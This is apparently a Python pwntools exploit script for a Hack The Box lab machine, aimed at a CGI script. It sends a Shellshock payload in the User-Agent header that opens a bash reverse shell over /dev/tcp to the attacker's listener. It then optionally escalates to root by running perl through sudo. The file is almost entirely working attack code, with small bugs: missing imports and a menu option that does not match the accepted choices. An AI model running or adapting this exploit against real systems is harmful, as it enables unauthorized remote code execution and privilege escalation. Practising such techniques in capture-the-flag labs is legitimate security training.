#!/usr/bin/env python3

from pwn import *
import netifaces as ni
import urllib3, sys, argparse, subprocess, pty, time
urllib3.disable_warnings()
warnings.filterwarnings("ignore", category=UserWarning, module="pwntools")

proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "https://127.0.0.1:8080"
}

try:
    ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
except:
    print("[-] You are not connected to HTB VPN")
    sys.exit(-2)

def exploit(RHOST, user):
    session = requests.session()
    listener = listen(0)
    port = listener.lport
    header = {
        'User-Agent':f'() {{ foo;}}; echo Content-Type: text/plain ; echo ; /bin/bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"'
    }
    log.info("Sending the payload to the target!")
    try:
        web_session = requests.get(f"http://{RHOST}/cgi-bin/user.sh", headers=header, verify=False, proxies=proxy, timeout=2)
    except:
        pass
    log.info("Waiting for connection!")
    shell = listener.wait_for_connection()
    #shell.sendline("SHELL=/bin/bash script -q /dev/null".encode())
    if user==1:
        print("Got the user shelly!")
        shell.interactive()
    elif user==2:
        shell.sendline(f'''sudo /usr/bin/perl -e 'exec "/bin/bash";\''''.encode())
        # shell.sendline("SHELL=/bin/bash script -q /dev/null".encode())
        #shell.recvline().decode()
        print("Got the user Root!")
        shell.interactive()
    else:
        print("[-] Entered Option is incorrect!")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-rht', '--RHOST', required=True, help="Enter the target IP Address")
    argv = parser.parse_args()
    RHOST = argv.RHOST
    RHOST = RHOST.strip()
    response = subprocess.Popen(["ping", "-c", "3", RHOST], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = response.communicate()
    if "icmp_seq=" in output.decode():
        print("[+] The machine is up and running")
    else:
        print("[-] The machine is down or not started")
        sys.exit(-2)
    print('''
    1. Shelly(user)
    3. Root
    ''')
    user = input("[+] Enter the user you want to pwn : ")
    user = int(user.strip())
    if user > 0 and user <= 2:
        exploit(RHOST, user)
    else:
        print("[-] Invalid Options!")


if __name__ == "__main__":
    main()
